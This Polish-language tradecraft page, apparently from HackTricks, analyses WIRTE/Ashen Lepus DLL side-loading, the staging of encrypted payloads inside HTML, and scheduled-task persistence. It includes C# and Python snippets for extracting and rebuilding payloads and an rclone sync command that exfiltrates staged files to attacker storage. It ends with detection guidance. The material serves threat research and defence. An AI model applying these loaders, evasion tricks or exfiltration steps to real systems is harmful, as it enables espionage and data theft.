# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd Tradecraft

Ashen Lepus (znany również jako WIRTE) wykorzystywał powtarzalny schemat łączący DLL sideloading, staged HTML payloads oraz modularne backdoory .NET w celu utrzymania dostępu w sieciach dyplomatycznych Bliskiego Wschodu. Technika ta może być stosowana przez dowolnego operatora, ponieważ opiera się na:<sup>[[1]](#references)</sup>

- **Socjotechnice opartej na archiwach**: nieszkodliwe pliki PDF instruują cele, aby pobrały archiwum RAR z serwisu do udostępniania plików. Archiwum zawiera wyglądający wiarygodnie EXE przeglądarki dokumentów, złośliwy DLL nazwany tak jak zaufana biblioteka (np. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) oraz przynętę `Document.pdf`.
- **Nadużyciu kolejności wyszukiwania DLL**: ofiara klika dwukrotnie EXE, Windows rozwiązuje import DLL z bieżącego katalogu, a złośliwy loader (AshenLoader) wykonuje się wewnątrz zaufanego procesu, podczas gdy przynęta w postaci pliku PDF otwiera się, aby uniknąć podejrzeń.
- **Stagingu w stylu Living-off-the-land**: każdy kolejny etap (AshenStager → AshenOrchestrator → modules) pozostaje poza dyskiem do momentu użycia i jest dostarczany jako zaszyfrowany blob ukryty w pozornie nieszkodliwych odpowiedziach HTML.

## Wieloetapowy łańcuch Side-Loading

1. **Decoy EXE → AshenLoader**: EXE wykonuje DLL sideloading AshenLoader, który przeprowadza rekonesans hosta, szyfruje go za pomocą AES-CTR i wysyła metodą POST wewnątrz rotujących parametrów, takich jak `token=`, `id=`, `q=` lub `auth=`, do ścieżek wyglądających jak API (np. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Ekstrakcja HTML**: C2 ujawnia kolejny etap tylko wtedy, gdy adres IP klienta wskazuje geolokalizację w docelowym regionie, a `User-Agent` pasuje do implantu, co utrudnia działanie sandboxów. Gdy kontrole zakończą się pomyślnie, treść HTTP zawiera blob `<headerp>...</headerp>` z payloadem AshenStager zaszyfrowanym za pomocą Base64/AES-CTR.
3. **Drugi sideloading**: AshenStager jest wdrażany wraz z innym legalnym plikiem binarnym, który importuje `wtsapi32.dll`. Złośliwa kopia wstrzyknięta do pliku binarnego pobiera więcej HTML, tym razem wycinając `<article>...</article>` w celu odzyskania AshenOrchestrator.
4. **AshenOrchestrator**: modularny kontroler .NET, który dekoduje konfigurację JSON w Base64. Pola `tg` i `au` konfiguracji są konkatenowane/haszowane w celu utworzenia klucza AES, który odszyfrowuje `xrk`. Wynikowe bajty służą jako klucz XOR dla każdego kolejnego bloba modułu.
5. **Dostarczanie modułów**: każdy moduł jest opisywany za pomocą komentarzy HTML, które przekierowują parser do dowolnego tagu, omijając statyczne reguły wyszukujące wyłącznie `<headerp>` lub `<article>`. Moduły obejmują persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) oraz file exploration (`FE`).

### Wzorzec parsowania kontenera HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Nawet jeśli obrońcy zablokują lub usuną konkretny element, operator musi jedynie zmienić tag wskazany w komentarzu HTML, aby wznowić dostarczanie.<sup>[[1]](#references)</sup>

### Szybki pomocnik ekstrakcji (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralele Evasion w HTML Staging

Najnowsze badania nad HTML smuggling (Talos) wskazują na payloady ukryte jako ciągi Base64 wewnątrz bloków `<script>` w załącznikach HTML i dekodowane przez JavaScript w czasie działania.<sup>[[2]](#references)</sup> Ten sam trik można ponownie wykorzystać w odpowiedziach C2: zaszyfrowane bloby można umieścić wewnątrz znacznika script (lub innego elementu DOM), a następnie dekodować je w pamięci przed użyciem AES/XOR, dzięki czemu strona wygląda jak zwykły HTML. Talos pokazuje również wielowarstwową obfuskację (zmiana nazw identyfikatorów oraz Base64/Caesar/AES) wewnątrz znaczników script, co dobrze pasuje do blobów C2 staged w HTML.<sup>[[2]](#references)</sup> Późniejszy raport Talos dotyczący **hidden text salting** jest również istotny: podzielenie Base64 za pomocą nieistotnych komentarzy HTML lub białych znaków wystarczy, aby zakłócić działanie prostych ekstraktorów regex, jednocześnie zachowując banalną rekonstrukcję po stronie przeglądarki.<sup>[[7]](#references)</sup>

## Uwagi dotyczące nowszych wariantów (2024-2025)

- Check Point zaobserwował w 2024 roku kampanie WIRTE, które nadal opierały się na sideloadingu z użyciem archiwów, ale wykorzystywały `propsys.dll` (stagerx64) jako pierwszy stage. Stager dekoduje kolejny payload za pomocą Base64 + XOR (klucz `53`), wysyła żądania HTTP ze zhardkodowanym `User-Agent` i wyodrębnia zaszyfrowane bloby osadzone pomiędzy znacznikami HTML. W jednej gałęzi stage był rekonstruowany z długiej listy osadzonych ciągów IP dekodowanych za pomocą `RtlIpv4StringToAddressA`, a następnie łączonych w bajty payloadu.<sup>[[3]](#references)</sup>
- OWN-CERT opisał wcześniejsze narzędzia WIRTE, w których side-loaded `wtsapi32.dll` dropper chronił stringi za pomocą Base64 + TEA i używał samej nazwy DLL jako klucza deszyfrującego, a następnie obfuskował dane identyfikujące host za pomocą XOR/Base64 przed wysłaniem ich do C2.<sup>[[4]](#references)</sup>

## Odtwarzanie Stage zakodowanych jako IP

Gałąź WIRTE z 2024 roku wykorzystująca `propsys.dll` pokazuje, że kolejny PE nie musi znajdować się w jednym spójnym blobie HTML. Loader może przechowywać bajty stage jako ciągi dotted-quad i odtwarzać je za pomocą `RtlIpv4StringToAddressA` — jest to wzorzec blisko powiązany z tradecraftem **IPfuscation** grupy Hive.<sup>[[3]](#references)[[5]](#references)</sup> Z punktu widzenia działań operacyjnych jest to przydatne, gdy actor chce, aby strona HTML zawierała coś, co wygląda na nieszkodliwe IOC lub dane konfiguracyjne, zamiast oczywistego payloadu Base64.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Jeśli odzyskane bajty zaczynają się od `MZ`, prawdopodobnie bezpośrednio zrekonstruowano kolejny plik PE. Jeśli nie, sprawdź, czy na początku nie znajduje się warstwa XOR/Base64 albo niewielkie fragmenty separatorów między adresami.

## Wymienne nazwy DLL i rotacja hostów

Istotną zaletą tego wzorca jest to, że **backend stagingu HTML/AES/XOR może pozostać identyczny, podczas gdy zmienia się tylko para sideloadingu**. WIRTE używał naprzemiennie `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` oraz `propsys.dll` w różnych kampaniach, co jest przydatne, ponieważ:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` i `wtsapi32.dll` to typowe nazwy Windows DLL, których obrońcy spodziewają się w `%System32%` / `%SysWOW64%`.
- Publiczne katalogi, takie jak **HijackLibs**, mapują już wiele plików binarnych, które załadują te nazwy DLL ze skopiowanego katalogu aplikacji, zapewniając operatorom zastępcze hosty bez konieczności przeprojektowywania stagera.
- Dostosowania wymaga wyłącznie powierzchnia eksportów dla danego hosta. Parser HTML, procedury AES/XOR oraz loader modułów można zwykle przenieść bez zmian do proxy DLL przekazującej wywołania.

W przypadku pracy w ofensywnym laboratorium oznacza to, że problem można podzielić na **(1) znalezienie stabilnego, podpisanego hosta, który lokalnie rozwiązuje wybraną nazwę DLL, oraz (2) ponowne użycie tej samej logiki loadera staged HTML za tą DLL**.

## Wzmocnienie Crypto i C2

- **AES-CTR wszędzie**: obecne loadery zawierają klucze 256-bitowe oraz nonce'y (np. `{9a 20 51 98 ...}`), a opcjonalnie dodają warstwę XOR z użyciem ciągów takich jak `msasn1.dll` przed deszyfrowaniem lub po nim.<sup>[[1]](#references)</sup>
- **Warianty materiału kluczowego**: wcześniejsze loadery używały Base64 + TEA do ochrony osadzonych ciągów, przy czym klucz deszyfrujący był wyprowadzany z nazwy złośliwej DLL (np. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Podział infrastruktury + kamuflaż subdomen**: serwery stagingowe są rozdzielone według narzędzi, hostowane w różnych ASN-ach i czasami ukryte za subdomenami wyglądającymi na legalne, więc ujawnienie jednego stage'a nie odsłania pozostałych.
- **Przemycanie recon**: zbierane dane obejmują obecnie także listy zawartości Program Files w celu wykrywania aplikacji o wysokiej wartości i zawsze są szyfrowane przed opuszczeniem hosta.
- **Rotacja URI**: parametry zapytań i ścieżki REST zmieniają się między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), unieważniając kruche detekcje.
- **Przypinanie User-Agent + bezpieczne przekierowania**: infrastruktura C2 odpowiada wyłącznie na dokładnie określone ciągi UA, a w przeciwnym razie przekierowuje do nieszkodliwych serwisów informacyjnych lub zdrowotnych, aby wtopić się w normalny ruch.
- **Gated delivery**: serwery są objęte geo-fencingiem i odpowiadają wyłącznie prawdziwym implantom. Niezatwierdzeni klienci otrzymują niewzbudzający podejrzeń HTML.

## Persistence i pętla wykonawcza

AshenStager tworzy scheduled tasks podszywające się pod zadania konserwacyjne Windows i wykonujące się za pośrednictwem `svchost.exe`, np.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Zadania te ponownie uruchamiają łańcuch sideloadingu podczas startu systemu lub w określonych odstępach, dzięki czemu AshenOrchestrator może pobierać świeże moduły bez ponownego zapisywania ich na dysku.

## Używanie benign sync clients do eksfiltracji

Operatorzy umieszczają dokumenty dyplomatyczne w `C:\Users\Public` (czytelne dla wszystkich użytkowników i niewzbudzające podejrzeń) za pomocą dedykowanego modułu, a następnie pobierają legalny plik binarny [Rclone](https://rclone.org/), aby synchronizować ten katalog ze storage'em atakującego. Unit42 odnotowuje, że jest to pierwszy zaobserwowany przypadek użycia Rclone przez tego aktora do eksfiltracji, co wpisuje się w szerszy trend nadużywania legalnych narzędzi synchronizacyjnych w celu upodobnienia ruchu do normalnego:<sup>[[1]](#references)</sup>

1. **Stage**: skopiuj/zbierz pliki docelowe do `C:\Users\Public\{campaign}\`.
2. **Configure**: dostarcz konfigurację Rclone wskazującą endpoint HTTPS kontrolowany przez atakującego (np. `api.technology-system[.]com`).
3. **Sync**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, aby ruch przypominał standardowe backupy cloud.

Ponieważ Rclone jest szeroko używany w legalnych procesach backupu, obrońcy powinni koncentrować się na anomaliach wykonania (nowe pliki binarne, nietypowe remote'y lub nagła synchronizacja `C:\Users\Public`).

## Punkty detekcji

- Generuj alerty dotyczące **podpisanych procesów**, które nieoczekiwanie ładują DLL z lokalizacji zapisywalnych przez użytkowników (filtry Procmon + `Get-ProcessMitigation -Module`), szczególnie gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi`, `wtsapi32` lub `propsys`.<sup>[[6]](#references)</sup>
- Analizuj podejrzane odpowiedzi HTTPS pod kątem **dużych blobów Base64 osadzonych w nietypowych tagach** lub chronionych komentarzami `<!-- TAG: <xyz> -->`.
- Najpierw normalizuj HTML: **usuń komentarze i zredukuj białe znaki przed ekstrakcją Base64**, ponieważ evasion w stylu hidden-text-salting może dzielić payloady na granicach komentarzy.
- Rozszerz wyszukiwanie w HTML o **ciągi Base64 wewnątrz bloków `<script>`** (staging w stylu HTML smuggling), które są dekodowane przez JavaScript przed przetwarzaniem AES/XOR.
- Wyszukuj powtarzające się wywołania **`RtlIpv4StringToAddressA`, po których następuje składanie bufora**, szczególnie gdy otaczające je ciągi to długie listy IPv4, a nie rzeczywiste cele sieciowe.
- Wyszukuj **scheduled tasks**, które uruchamiają `svchost.exe` z argumentami innymi niż usługowe lub wskazują katalogi droppera.
- Śledź **przekierowania C2**, które zwracają payloady wyłącznie dla dokładnych ciągów `User-Agent`, a w przeciwnym razie przekierowują do legalnych domen informacyjnych lub zdrowotnych.
- Monitoruj pojawianie się plików binarnych **Rclone** poza lokalizacjami zarządzanymi przez IT, nowych plików `rclone.conf` oraz zadań synchronizacji pobierających dane z katalogów stagingowych, takich jak `C:\Users\Public`.

## Referencje

- [1] [Ashen Lepus powiązany z Hamasem atakuje podmioty dyplomatyczne Bliskiego Wschodu za pomocą nowego zestawu malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Ukryte między tagami: spostrzeżenia dotyczące technik evasion w HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Aktor zagrożeń WIRTE powiązany z Hamasem kontynuuje operacje na Bliskim Wschodzie i przechodzi do działań destrukcyjnych](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: W poszukiwaniu straconego czasu](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware wdraża nowatorską technikę IPfuscation w celu uniknięcia detekcji](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potencjalny sideloading systemowych DLL z lokalizacji niesystemowych](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Urozmaicanie zagrożeń e-mailowych za pomocą hidden-text-salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
